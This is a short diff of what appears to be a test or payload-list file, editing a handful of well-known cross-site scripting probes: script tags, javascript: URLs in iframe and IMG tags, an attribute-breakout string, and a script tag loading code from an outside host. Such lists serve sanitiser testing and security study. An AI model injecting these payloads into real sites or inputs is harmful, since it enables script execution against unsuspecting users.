@@ -9,16 +9,14 @@ tags:
 ---
 <script>alert("hello")</script>
 
-"><iframe src=javascript:alert(1)>
-
-
+"><iframe src=javascript:alert(1);>
 
 <IMG SRC="javascript:alert('XSS');">
 
 <IMG SRC=javascript:alert(&quot;XSS&quot;)>
 
-\";alert('XSS');//
-
-
+";alert('XSS');//
 
 <SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>
+
+<script>alert('xss');</script>
